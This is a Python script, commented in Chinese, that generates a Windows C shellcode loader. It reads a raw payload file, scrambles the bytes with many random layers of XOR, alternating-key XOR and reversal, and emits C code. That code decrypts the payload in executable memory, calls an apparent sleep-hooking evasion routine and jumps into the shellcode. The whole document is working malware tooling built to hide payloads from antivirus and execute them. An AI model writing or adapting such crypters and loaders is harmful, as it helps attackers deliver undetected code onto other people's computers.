import re
import random
import struct
import os
from tqdm import *

def generate_shellcode_code(shellcode_file_path, xor_layers):
    # 从文件读取原始shellcode
    if not os.path.exists(shellcode_file_path):
        raise FileNotFoundError(f"Shellcode file not found: {shellcode_file_path}")
    
    with open(shellcode_file_path, 'rb') as f:
        file_content = f.read()
        original_bytes = file_content
    
    # 生成随机密钥 (避免0x00)
    keys = []
    for _ in range(xor_layers):
        key = random.randint(0x01, 0xFF)
        keys.append(key)
    
    # 生成指令序列 (0=全局异或, 1=奇偶异或, 2=反转)
    instructions = []
    for _ in range(xor_layers):
        instructions.append(random.randint(0, 2))
    
    # 多层复杂加密
    encrypted_bytes = original_bytes
    for i in tqdm(range(xor_layers), desc="Encrypting shellcode"):
        op = instructions[i]
        key = keys[i]
        
        if op == 0:  # 全局异或
            encrypted_bytes = bytes(byte ^ key for byte in encrypted_bytes)
        elif op == 1:  # 奇偶异或
            new_bytes = []
            for idx, byte in enumerate(encrypted_bytes):
                if idx % 2 == 0:  # 偶数索引
                    new_bytes.append(byte ^ key)
                else:  # 奇数索引
                    new_bytes.append(byte ^ (key ^ 0xFF))  # 使用互补密钥
            encrypted_bytes = bytes(new_bytes)
        elif op == 2:  # 反转
            encrypted_bytes = encrypted_bytes[::-1]
    
    shellcode_length = len(encrypted_bytes)
    
    # 构建加密的shellcode数组字符串
    shellcode_array = "unsigned char encrypted_shellcode[] = {\n"
    for i in range(0, shellcode_length, 16):
        chunk = encrypted_bytes[i:i+16]
        hex_chunk = ', '.join(f"0x{byte:02X}" for byte in chunk)
        shellcode_array += f"    {hex_chunk},\n"
    shellcode_array += "};\n"
    shellcode_array += f"int shellcode_length = {shellcode_length};\n"
    
    # 构建密钥数组字符串
    keys_array = "BYTE xor_keys[] = {\n    "
    keys_array += ", ".join(f"0x{key:02X}" for key in keys)
    keys_array += "\n};\n"
    keys_array += f"int xor_layers = {xor_layers};\n"
    
    # 构建指令数组字符串
    instructions_array = "BYTE instructions[] = {\n    "
    instructions_array += ", ".join(f"0x{ins:02X}" for ins in instructions)
    instructions_array += "\n};\n"
    
    # 构建完整的C语言代码
    c_code = f"""
#include <windows.h>
#include <stdio.h>
#include <string.h>

// 复杂加密的Shellcode (共{xor_layers}层)
{shellcode_array}

// 异或密钥数组
{keys_array}

// 解密指令数组 (0=全局异或, 1=奇偶异或, 2=反转)
{instructions_array}

// 反转字节数组
void reverse_bytes(BYTE *data, int length) {{
    for (int i = 0; i < length / 2; i++) {{
        BYTE temp = data[i];
        data[i] = data[length - i - 1];
        data[length - i - 1] = temp;
    }}
}}

// 执行复杂解密
void complex_decrypt(BYTE *data, int length) {{
    //printf("[*] Starting complex decryption with %d layers...\\n", xor_layers);
    
    // 从最后一层开始反向解密
    for (int i = xor_layers - 1; i >= 0; i--) {{
        BYTE op = instructions[i];
        BYTE key = xor_keys[i];
        
        //printf("[+] Layer %d: ", xor_layers - i);
        
        switch (op) {{
            case 0: // 全局异或
                //printf("Global XOR with key 0x%02X\\n", key);
                for (int j = 0; j < length; j++) {{
                    data[j] ^= key;
                }}
                break;
                
            case 1: // 奇偶异或
                //printf("Parity XOR with keys 0x%02X and 0x%02X\\n", key, key ^ 0xFF);
                for (int j = 0; j < length; j++) {{
                    if (j % 2 == 0) {{
                        data[j] ^= key; // 偶数索引
                    }} else {{
                        data[j] ^= (key ^ 0xFF); // 奇数索引
                    }}
                }}
                break;
                
            case 2: // 反转
                //printf("Reversing byte order\\n");
                reverse_bytes(data, length);
                break;
                
            default:
                //printf("Unknown operation 0x%02X, skipping\\n", op);
                break;
        }}
    }}
    
    //printf("[+] Shellcode fully decrypted!\\n");
}}

// 解密并执行Shellcode的函数
void execute_shellcode() {{
    // 分配可执行内存
    void *exec_mem = VirtualAlloc(NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {{
        //printf("[!] VirtualAlloc failed: %d\\n", GetLastError());
        return;
    }}
    
    // 复制加密的shellcode到可执行内存
    memcpy(exec_mem, encrypted_shellcode, shellcode_length);
    
    // 执行复杂解密
    complex_decrypt((BYTE *)exec_mem, shellcode_length);
    
    // 验证解密结果 (可选)
    #ifdef DEBUG
    //printf("[*] First 16 bytes of decrypted shellcode: ");
    for (int i = 0; i < 16 && i < shellcode_length; i++) {{
        //printf("0x%02X ", ((BYTE *)exec_mem)[i]);
    }}
    //printf("\\n");
    #endif
    pMemory=exec_mem;
    HookSleep();
    // 创建函数指针并执行
    void (*func)() = (void (*)())exec_mem;
    //printf("[*] Executing shellcode...\\n");
    func();
    
    // 注意: 如果shellcode执行后返回，可以添加内存释放逻辑
    // VirtualFree(exec_mem, 0, MEM_RELEASE);
}}
// 动态API解析
FARPROC resolve_api(const char *module_name, const char *func_name) {{
    HMODULE hModule = GetModuleHandleA(module_name);
    if (!hModule) {{
        hModule = LoadLibraryA(module_name);
        if (!hModule) return NULL;
    }}
    return GetProcAddress(hModule, func_name);
}}
"""
    return c_code

if __name__ == "__main__":    
    try:
        c_program = generate_shellcode_code(shellcode_file_path="payload_x64.bin", xor_layers=100)
        print(c_program)
    except Exception as e:
        print(f"Error: {e}")